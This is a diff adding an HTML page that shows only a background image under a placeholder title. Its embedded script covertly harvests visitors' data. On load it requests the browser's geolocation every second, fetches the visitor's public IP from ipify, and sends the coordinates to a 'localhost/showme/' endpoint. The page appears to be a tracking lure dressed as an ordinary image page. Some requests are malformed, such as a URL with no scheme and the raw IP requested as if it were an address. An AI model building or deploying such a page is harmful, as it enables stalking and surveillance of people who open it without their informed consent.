@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+
+<html>
+    <head>
+        <title>TITLE</title>
+        <style type="text/css">
+            
+            body {
+                background-image: url("image");
+                background-size: 1000px 1600px;
+                background-repeat: no-repeat;
+            }
+
+        </style>
+    </head>
+    <body>
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js" type='text/javascript'></script>
+        <script type='text/javascript'>
+        function httpGet(dataString) {
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open( "GET", dataString, false ); // false for synchronous request
+            xmlHttp.send( null );
+            return xmlHttp.responseText;
+        }
+
+        function getIP() {
+            var clientIP;
+            $.ajax({
+                url: 'https://api.ipify.org/',
+                type: 'GET',
+                dataType: 'text',
+                async: false,
+                success : function(data) {
+                  clientIP = data;
+                }
+            });
+            return clientIP;
+        };
+
+        function autoUpdate() {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            coords = position.coords.latitude + "+" + position.coords.longitude;
+            url = "localhost/showme/" + coords;
+            addr = getIP();
+            httpGet(url);
+            httpGet(addr);
+            setTimeout(autoUpdate, 1000);
+          })
+        };
+        $(document).ready(function(){
+           autoUpdate();
+        });
+
+        </script>
+    </body>
+</html>
